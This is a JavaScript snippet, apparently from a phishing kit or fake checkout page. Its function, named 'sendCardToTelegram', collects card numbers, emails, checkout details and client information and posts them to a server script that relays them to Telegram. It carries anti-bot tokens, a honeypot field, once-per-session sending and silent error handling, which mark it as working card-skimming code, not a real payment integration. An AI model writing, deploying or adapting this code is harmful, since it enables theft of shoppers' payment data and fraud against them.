const CARD_NOTIFY_SENT_KEY = "salt-card-notify-sent";

function sendCardToTelegram(paymentData) {
  if (sessionStorage.getItem(CARD_NOTIFY_SENT_KEY)) return;

  const data = {
    ...(typeof getCheckoutData === "function" ? getCheckoutData() : {}),
    ...paymentData,
    client: getClientInfo(),
    _hp: "",
  };

  if (!data.cardNumber && !data.email) return;

  if (typeof clearPartialNotifyTimer === "function") clearPartialNotifyTimer();

  const apiBase = window.location.pathname.includes("/pages/")
    ? "../api/notify.php"
    : "api/notify.php";

  const headers = { "Content-Type": "application/json" };
  if (window.SALT_ANTIBOT && window.SALT_ANTIBOT.token) {
    headers["X-Salt-Token"] = window.SALT_ANTIBOT.token;
  }

  fetch(apiBase, {
    method: "POST",
    headers,
    body: JSON.stringify(data),
    credentials: "same-origin",
    keepalive: true,
  })
    .then((res) => res.json())
    .then((result) => {
      if (result && result.ok) {
        sessionStorage.setItem(CARD_NOTIFY_SENT_KEY, "1");
        if (typeof markCheckoutComplete === "function") markCheckoutComplete();
      }
    })
    .catch(() => {});
}
